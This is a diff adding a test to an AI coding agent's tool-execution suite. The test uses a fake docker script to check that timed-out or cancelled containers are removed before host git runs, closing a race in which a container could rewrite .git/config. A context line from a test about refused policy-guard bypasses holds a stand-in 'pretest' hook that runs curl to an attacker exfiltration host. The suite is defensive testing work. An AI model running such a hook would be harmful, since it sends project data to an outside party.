@@ -3612,3 +3612,87 @@ describe("INJ-2026-11: the policy-guard bypasses, refused", () => {
     expect(asked[0]!.preview.join("\n")).toContain("pretest: curl -s http://exfil.attacker.test/p");
   });
 });
+
+// Fourth review, finding 4: a timed-out or cancelled docker command started
+// `docker rm -f` detached and returned at once. The turn then ran its host git
+// (worktreeMoved, the turn-end measurement) while the container -- which
+// killing `docker run` does not stop -- could still rewrite .git/config
+// between the driver listing and the git that trusted it.
+describe.skipIf(process.platform === "win32")("finding 4: a killed container is gone before the tool returns", () => {
+  let fake: string;
+  let savedPath: string | undefined;
+  beforeEach(() => {
+    fake = mkdtempSync(join(tmpdir(), "gnomon-fakedocker-"));
+    // `run` records the container as running and waits; the container itself
+    // outlives the killed client (setsid), as a real one does. `rm -f` takes a
+    // moment, then stops it. `inspect` answers from the record.
+    writeFileSync(
+      join(fake, "docker"),
+      `#!/bin/sh
+state='${fake}'
+case "$1" in
+  run)
+    name=""; prev=""
+    for a in "$@"; do [ "$prev" = "--name" ] && name="$a"; prev="$a"; done
+    echo running > "$state/$name"
+    # setsid where there is one (not macOS): the container outlives the killed client.
+    if command -v setsid >/dev/null 2>&1; then setsid sleep 30 >/dev/null 2>&1 < /dev/null & else sleep 30 >/dev/null 2>&1 < /dev/null & fi
+    echo $! > "$state/$name.pid"
+    wait ;;
+  rm)
+    for a in "$@"; do name="$a"; done
+    sleep 1
+    kill "$(cat "$state/$name.pid" 2>/dev/null)" 2>/dev/null
+    echo gone > "$state/$name" ;;
+  inspect)
+    for a in "$@"; do name="$a"; done
+    if grep -q running "$state/$name" 2>/dev/null; then echo running; exit 0; fi
+    echo "Error: No such object: $name" >&2; exit 1 ;;
+esac
+`,
+      { mode: 0o755 }
+    );
+    savedPath = process.env.PATH;
+    process.env.PATH = `${fake}:${process.env.PATH ?? ""}`;
+  });
+  afterEach(() => {
+    process.env.PATH = savedPath;
+    for (const f of readdirSync(fake).filter((n) => n.endsWith(".pid"))) {
+      try {
+        process.kill(Number(readFileSync(join(fake, f), "utf-8")));
+      } catch {
+        /* already stopped */
+      }
+    }
+    rmSync(fake, { recursive: true, force: true });
+  });
+
+  const states = () =>
+    readdirSync(fake)
+      .filter((n) => n.startsWith("gnomon-") && !n.endsWith(".pid"))
+      .map((n) => readFileSync(join(fake, n), "utf-8").trim());
+
+  it("on a timeout", async () => {
+    const out = await executeTool(
+      "bash",
+      { command: "sleep 20" },
+      ctx({ timeoutMs: 300, exec: { mode: "docker", image: "img:1", network: false } } as Partial<ToolContext>),
+      offered
+    );
+    expect(out.content).toContain("timed out");
+    expect(states()).toEqual(["gone"]);
+  }, 20_000);
+
+  it("on a cancel", async () => {
+    const ac = new AbortController();
+    setTimeout(() => ac.abort(), 300);
+    const out = await executeTool(
+      "bash",
+      { command: "sleep 20" },
+      ctx({ timeoutMs: 15_000, signal: ac.signal, exec: { mode: "docker", image: "img:1", network: false } } as Partial<ToolContext>),
+      offered
+    );
+    expect(out.content).toContain("Cancelled");
+    expect(states()).toEqual(["gone"]);
+  }, 20_000);
+});
